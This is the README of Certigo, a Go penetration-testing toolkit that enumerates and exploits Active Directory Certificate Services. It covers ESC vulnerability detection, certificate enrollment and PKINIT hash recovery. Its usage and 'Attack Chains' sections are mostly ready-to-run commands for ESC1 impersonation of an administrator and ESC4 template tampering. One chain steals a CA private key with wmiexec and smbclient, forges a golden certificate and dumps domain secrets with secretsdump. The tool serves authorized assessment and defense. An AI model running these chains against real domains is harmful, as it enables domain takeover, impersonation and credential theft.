# Certigo

<p align="center">
  <img src="certigo.jpg" alt="Certigo" width="300">
</p>

An Active Directory Certificate Services (AD CS) enumeration and exploitation toolkit written in Go. Inspired by [Certipy](https://github.com/ly4k/Certipy), designed for portability and performance.

## Features

- **AD CS Enumeration** — Discover CAs, templates, detect ESC1–ESC4, ESC6–ESC9, ESC13, ESC15 with exploitability scoring
- **Certificate Enrollment** — Request certs via RPC (ICertPassage), HTTP/HTTPS (certsrv), or SMB named pipe
- **PKINIT Authentication** — Authenticate with certificates, recover NT hashes (UnPAC-the-Hash)
- **Certificate Inspection** — Inspect PFX/PEM certificates locally (subject, EKUs, SANs, key size)
- **CA Administration** — Dump CA config, revoke certs, manage templates via DCOM (ICertAdminD/D2)
- **Remote Registry Fallback** — Retrieve CA policy flags (EditFlags, RequestDisposition) via RRP when DCOM fails
- **Template Management** — Enable/disable templates on the CA, ESC4 exploitation (modify → ESC1 → restore)
- **Golden Certificate Forgery** — Forge certs as any user using a stolen CA private key
- **Report Generation** — Professional pentest reports in Markdown, HTML (dark theme), and PDF with attack commands and remediation
- **Security Descriptor Parsing** — Full Windows ACL/ACE/SID parsing with permission analysis
- **Pass-the-Hash** — NTLM hash authentication on all commands via `--hashes LM:NT`
- **SOCKS Proxy Support** — Route all traffic through SOCKS5 proxies (e.g., Chisel, proxychains)
- **Library-First Design** — All functionality available as importable Go packages

## Installation

```bash
go install github.com/ineffectivecoder/certigo/cmd/certigo@latest
```

Or build from source:

```bash
git clone https://github.com/ineffectivecoder/certigo.git
cd certigo
go build -o certigo ./cmd/certigo
```

## Commands

| Command | Description |
|---------|-------------|
| `find` | Enumerate CAs and templates, detect ESC vulnerabilities |
| `req` | Request certificates (RPC / pipe / HTTP) |
| `auth` | PKINIT authentication → TGT + NT hash |
| `template` | Modify/restore certificate templates (ESC4 exploitation) |
| `cert show` | Inspect PFX/PEM certificate details |
| `ca backup` | Backup CA public certificate from LDAP |
| `ca config` | Dump CA configuration (DCOM + RRP fallback) |
| `ca revoke` | Revoke a certificate by serial number |
| `ca list-templates` | List templates enabled on the CA |
| `ca enable-template` | Enable a template on the CA |
| `ca disable-template` | Disable a template on the CA |
| `forge` | Golden certificate forgery |

## Usage

### Find (Enumerate AD CS)

```bash
# Basic enumeration
certigo find -u user@corp.local --dc-ip 10.0.0.1

# With NTLM hash (pass-the-hash)
certigo find -u administrator -d corp.local --dc-ip 10.0.0.1 -H :aabbccdd11223344

# Only vulnerable templates
certigo find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable

# Enabled + vulnerable only
certigo find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable --enabled

# Filter by CA name
certigo find -u user@corp.local --dc-ip 10.0.0.1 --ca-name 'corp-CA'

# JSON output
certigo find -u user@corp.local --dc-ip 10.0.0.1 --json

# Generate Markdown pentest report
certigo find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable --report

# Generate self-contained HTML report (dark theme)
certigo find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable --report-html

# Generate PDF report (requires wkhtmltopdf or Chrome)
certigo find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable --report-pdf

# Generate all formats at once
certigo find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable --report --report-html --report-pdf
```

| Flag | Short | Description |
|------|-------|-------------|
| `--username` | `-u` | Username (user@domain or DOMAIN\user) |
| `--password` | `-p` | Password (prompted if omitted) |
| `--hashes` | `-H` | NTLM hash (LM:NT or :NT) |
| `--domain` | `-d` | Target domain |
| `--dc-ip` | | Domain Controller IP |
| `--scheme` | | LDAP scheme: `ldap` or `ldaps` (default: ldaps) |
| `--json` | | JSON output |
| `--no-color` | | Disable colored output |
| `--vulnerable` | | Show only vulnerable templates |
| `--enabled` | | Show only enabled templates |
| `--ca-name` | | Filter templates by publishing CA name |
| `--hide-admins` | | Hide default admin permissions |
| `--verbose` | `-v` | Verbose output |
| `--debug` | | Debug output |
| `--output` | `-o` | Output file prefix |

---

### Req (Request Certificates)

Three transport options for enrollment:

```bash
# Request via RPC (default — resolves endpoint via EPM on port 135)
certigo req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' --template User

# Request via SMB named pipe (port 445, no EPM needed)
certigo req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' --template User --pipe

# Request via HTTP/HTTPS (certsrv web enrollment)
certigo req -u user@corp.local --web http://ca.corp.local --ca 'corp-CA' --template User

# ESC1 — Request cert with UPN SAN override
certigo req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' \
  --template VulnTemplate --upn administrator@corp.local

# Retrieve a pending certificate (works with all transports)
certigo req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' --retrieve 42
```

| Flag | Short | Description |
|------|-------|-------------|
| `--ca` | | CA name (e.g., `corp-CA`) |
| `--template` | | Certificate template name |
| `--dc-ip` | | CA server IP (for RPC/pipe transport) |
| `--web` | | HTTP/HTTPS enrollment URL (e.g., `http://ca.corp.local`) |
| `--pipe` | | Use SMB named pipe transport (port 445) |
| `--username` | `-u` | Username |
| `--password` | `-p` | Password (prompted if omitted) |
| `--hashes` | `-H` | NTLM hash (LM:NT or :NT) |
| `--domain` | `-d` | Target domain |
| `--upn` | | UPN SAN override (for ESC1) |
| `--dns` | | DNS SAN override |
| `--subject` | | Certificate subject CN |
| `--retrieve` | | Retrieve pending cert by request ID |
| `--key-size` | | RSA key size (default: 2048) |
| `--output` | `-o` | Output file prefix |
| `--debug` | | Debug output |

---

### Auth (PKINIT Authentication)

Authenticate with a certificate and recover the NT hash — combines `gettgtpkinit` + `getnthash` into one command:

```bash
# Authenticate with PFX and recover NT hash
certigo auth -u administrator@corp.local --dc-ip 10.0.0.1 --pfx admin.pfx

# Skip NT hash recovery
certigo auth -u administrator@corp.local --dc-ip 10.0.0.1 --pfx admin.pfx --no-hash

# Custom output path
certigo auth -u administrator@corp.local --dc-ip 10.0.0.1 --pfx admin.pfx -o admin.ccache

# Base64-encoded PFX (useful for scripting)
certigo auth -u admin@corp.local --dc-ip 10.0.0.1 --pfx-base64 "MIIJ..."
```

| Flag | Short | Description |
|------|-------|-------------|
| `--pfx` | | PFX/PKCS12 certificate file |
| `--pfx-pass` | | PFX password (default: empty) |
| `--pfx-base64` | | PFX as base64 string |
| `--dc-ip` | | Domain Controller IP |
| `--username` | `-u` | Username (user@domain or DOMAIN\user) |
| `--domain` | `-d` | Target domain |
| `--output` | `-o` | Output ccache filename |
| `--no-hash` | | Skip NT hash recovery (U2U) |
| `--verbose` | `-v` | Verbose output |
| `--debug` | | Debug output |

---

### Cert (Certificate Inspection)

```bash
# Inspect a PFX certificate
certigo cert show certificate.pfx

# With password-protected PFX
certigo cert show encrypted.pfx --pfx-pass mypassword

# Inspect a PEM certificate
certigo cert show ca-cert.pem
```

Displays: Subject, Issuer, Serial, Validity, Signature Algorithm, Public Key (algorithm + size), Key Usage, Extended Key Usages, SANs, and CA chain.

| Flag | Short | Description |
|------|-------|-------------|
| `--pfx-pass` | | PFX password |

---

### CA (Certificate Authority Management)

```bash
# Backup CA certificate from LDAP
certigo ca backup --ca 'corp-CA' -u user@corp.local --dc-ip 10.0.0.1

# Dump CA configuration (EditFlags, RequestDisposition, CAType, etc.)
certigo ca config --ca 'corp-CA' -u admin -d corp.local --dc-ip 10.0.0.1 -H :hash

# Revoke a certificate by serial number
certigo ca revoke --ca 'corp-CA' --serial 0x1234 --reason keyCompromise \
  -u admin -d corp.local --dc-ip 10.0.0.1 -H :hash

# List templates enabled on the CA
certigo ca list-templates --ca 'corp-CA' -u admin -d corp.local --dc-ip 10.0.0.1

# Enable/disable a template
certigo ca enable-template --ca 'corp-CA' --template WebServer --template-oid 1.3.6.1... \
  -u admin -d corp.local --dc-ip 10.0.0.1
certigo ca disable-template --ca 'corp-CA' --template WebServer \
  -u admin -d corp.local --dc-ip 10.0.0.1
```

`ca config` retrieves configuration via DCOM (ICertAdminD2), with automatic **RRP fallback** for entries like `EditFlags` and `RequestDisposition` that CSRA can't return. Values are translated to human-readable form (e.g., `Enterprise Root CA`, decoded flag names).

| Flag | Short | Description |
|------|-------|-------------|
| `--ca` | | CA name (required for admin commands) |
| `--dc-ip` | | CA server IP |
| `--username` | `-u` | Username |
| `--password` | `-p` | Password |
| `--hashes` | `-H` | NTLM hash (LM:NT or :NT) |
| `--domain` | `-d` | Target domain |
| `--serial` | | Certificate serial (for revoke) |
| `--reason` | | Revocation reason (for revoke) |
| `--template` | | Template name (for enable/disable) |
| `--template-oid` | | Template OID (for enable) |
| `--scheme` | | LDAP scheme (default: ldaps, for backup) |
| `--output` | `-o` | Output filename |
| `--debug` | | Debug output |

---

### Forge (Golden Certificate)

Forge a certificate as any user using a stolen CA private key. The forged cert can be used with `certigo auth` for PKINIT authentication.

```bash
# Forge a cert as administrator using stolen CA PFX
certigo forge --ca-pfx stolen-ca.pfx --ca-pfx-pass BackupPassword --upn administrator@corp.local

# Using PEM cert + key pair
certigo forge --ca-cert ca.pem --ca-key ca.key --upn administrator@corp.local

# Custom validity and output
certigo forge --ca-pfx ca.pfx --upn admin@corp.local --validity 30 -o golden.pfx
```

| Flag | Short | Description |
|------|-------|-------------|
| `--ca-pfx` | | CA certificate + key as PFX file |
| `--ca-pfx-pass` | | PFX password |
| `--ca-cert` | | CA certificate (PEM) |
| `--ca-key` | | CA private key (PEM) |
| `--upn` | | UPN SAN for forged cert |
| `--dns` | | DNS SAN for forged cert |
| `--subject` | | Subject CN (default: derived from UPN) |
| `--serial` | | Serial number (default: random) |
| `--validity` | | Validity in days (default: 365) |
| `--key-size` | | RSA key size (default: 2048) |
| `--output` | `-o` | Output PFX filename |

---

### Template (ESC4 Exploitation)

Modify a certificate template's attributes to make it ESC1-exploitable, then restore after use.

```bash
# Modify template (saves backup automatically)
certigo template modify -u user@corp.local --dc-ip 10.0.0.1 \
  --template VulnTemplate

# Restore original template from backup
certigo template restore -u user@corp.local --dc-ip 10.0.0.1 \
  --backup VulnTemplate_backup.json
```

**Modify** changes these attributes:

- `msPKI-Certificate-Name-Flag` → add `ENROLLEE_SUPPLIES_SUBJECT`
- `msPKI-Enrollment-Flag` → clear `PEND_ALL_REQUESTS` (manager approval)
- `msPKI-RA-Signature` → set to `0` (no authorized signatures)
- `pKIExtendedKeyUsage` → set to Client Authentication

| Flag | Description |
|------|-------------|
| `--template` | Template name to modify (required for `modify`) |
| `--backup` | Backup file path (default: `{template}_backup.json`) |
| `--username` / `-u` | Username |
| `--password` / `-p` | Password (prompted if omitted) |
| `--hashes` / `-H` | NTLM hash (LM:NT or :NT) |
| `--domain` / `-d` | Target domain |
| `--dc-ip` | Domain Controller IP |
| `--scheme` | LDAP scheme (default: ldaps) |

---

## Attack Chains

### ESC1 — Enrollee Supplies Subject

```bash
# 1. Find vulnerable templates
certigo find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable

# 2. Request cert with admin UPN
certigo req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' \
  --template VulnTemplate --upn administrator@corp.local

# 3. Authenticate and recover NT hash
certigo auth -u administrator@corp.local --dc-ip 10.0.0.1 \
  --pfx corp-CA_VulnTemplate.pfx
```

### ESC4 — Template Modification

```bash
# 1. Find templates with dangerous ACLs
certigo find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable --enabled

# 2. Modify template to be ESC1-exploitable (auto-saves backup)
certigo template modify -u user@corp.local --dc-ip 10.0.0.1 \
  --template VulnTemplate

# 3. Request cert with admin UPN (now ESC1)
certigo req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' \
  --template VulnTemplate --upn administrator@corp.local

# 4. Restore original template
certigo template restore -u user@corp.local --dc-ip 10.0.0.1 \
  --backup VulnTemplate_backup.json

# 5. Authenticate with forged cert
certigo auth -u administrator@corp.local --dc-ip 10.0.0.1 \
  --pfx corp-CA_VulnTemplate.pfx
```

### Golden Certificate — Full Chain

```bash
# 1. Export CA private key on the CA server (requires DA)
wmiexec.py 'domain/admin:password@CA-IP' 'certutil -p BackupPass -backupKey C:\Windows\Temp\cakey'

# 2. Download the PFX via SMB
smbclient.py 'domain/admin:password@CA-IP'
# > use C$
# > cd Windows/Temp/cakey
# > get CA-Name.p12

# 3. Forge a golden cert
certigo forge --ca-pfx CA-Name.p12 --ca-pfx-pass BackupPass --upn administrator@corp.local

# 4. Authenticate → TGT + NT hash
certigo auth -u administrator@corp.local --dc-ip 10.0.0.1 \
  --pfx forged_administrator_corp.local.pfx

# 5. Use the NT hash
secretsdump.py -hashes :NT_HASH corp.local/administrator@10.0.0.1
```

## Transport Options

| Transport | Flag | Port | Description |
|-----------|------|------|-------------|
| RPC/TCP | `--dc-ip` (default) | 135 + dynamic | EPM endpoint resolution, then direct TCP |
| Named Pipe | `--dc-ip` + `--pipe` | 445 | SMB pipe `\pipe\cert`, no EPM needed |
| HTTP/HTTPS | `--web URL` | 80/443 | certsrv/certfnsh.asp with NTLM auth |
| DCOM | `--dc-ip` (ca admin) | 135 + dynamic | DCOM activation for ICertAdminD/D2 |
| RRP | automatic fallback | 445 | SMB pipe `\pipe\winreg` for registry |

### SOCKS Proxy Support

All commands support routing traffic through a SOCKS5 proxy:

```bash
# Via environment variable
export ALL_PROXY=socks5://127.0.0.1:1080
certigo find -u user@corp.local --dc-ip 10.0.0.1

# Useful with Chisel, ligolo-ng, or SSH tunnels
```

## Vulnerability Detection

| ESC | Description | Detection Method |
|-----|-------------|------------------|
| ESC1 | Enrollee supplies subject + auth EKU + no approval | Template flags |
| ESC2 | No EKU / Any Purpose + no approval | Template EKU list |
| ESC3 | Certificate Request Agent EKU | Template EKU list |
| ESC4 | Dangerous template ACL permissions | Security descriptor |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | CA flags |
| ESC7 | ManageCA / ManageCertificates by low-priv users | CA security descriptor |
| ESC8 | HTTP enrollment endpoints | CA enrollment servers |
| ESC9 | No security extension + enrollee supplies subject | Template flags |
| ESC13 | Issuance policies linked to groups | msPKI-RA-Policies |
| ESC15 | Schema v1 + enrollee supplies subject | Template schema/flags |

## Project Structure

```
certigo/
├── cmd/certigo/         # CLI entry point
├── docs/                 # Deep dive documentation with protocol diagrams
├── internal/commands/    # Cobra command definitions (find, req, auth, cert, ca, forge, template)
└── pkg/
    ├── adcs/             # AD CS enrollment, enumeration, DCOM admin, RRP fallback
    │   └── flags/        # Certificate template, EKU, and CA config flag constants
    ├── cert/             # Key generation, CSR creation, PFX handling
    ├── ldap/             # LDAP client, SID resolution
    ├── log/              # Structured logger
    ├── output/           # Text (colored), JSON, and report formatters
    └── security/         # Windows security descriptor parsing
```

## Testing

```bash
go test ./... -v
```

### Test Coverage

| Package | Tests | Coverage |
|---------|-------|----------|
| `pkg/adcs` | ESC1–ESC15 detection, EKU classification, flag parsing, file time duration, `hasExplicitClientAuth` | Vulnerability analysis, template properties |
| `pkg/adcs` (modify) | Save/load round-trip, invalid JSON, missing fields, ESC1 flag computation, flag preservation | Template modification logic |
| `pkg/adcs/flags` | `IsAuthenticationEKU`, `HasFlag`, `GetSetFlags` | Flag utilities and bitmask operations |
| `pkg/output` | Text formatter (color/no-color), JSON formatter, enhanced fields (exploitability, endpoints, ManageCA) | Output rendering |
| `pkg/ldap` | SID parsing and formatting | LDAP utilities |
| `pkg/cert` | Certificate loading and inspection | Certificate handling |
| `pkg/security` | Security descriptor parsing | ACL/ACE parsing |
| `pkg/log` | Logger levels and formatting | Logging |

## Documentation

See [docs/DEEP_DIVE.md](docs/DEEP_DIVE.md) for protocol flow diagrams and technical internals of every command.

## References

- [Certified Pre-Owned (SpecterOps)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Certipy](https://github.com/ly4k/Certipy)
- [ESC13 — Issuance Policy Abuse](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)
- [Microsoft AD CS Documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/)
- [MS-ICPR — ICertPassage Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-icpr/)
- [MS-WCCE — Certificate Enrollment Web Service](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/)
- [MS-CSRA — Certificate Services Remote Administration](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-csra/)
- [MS-DCOM — Distributed Component Object Model](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/)
- [MS-RRP — Windows Remote Registry Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/)
- [RFC 4556 — PKINIT](https://www.rfc-editor.org/rfc/rfc4556)

## Acknowledgements

This project was developed using [Claude Opus 4.6](https://www.anthropic.com/claude) by Anthropic.

## License

MIT
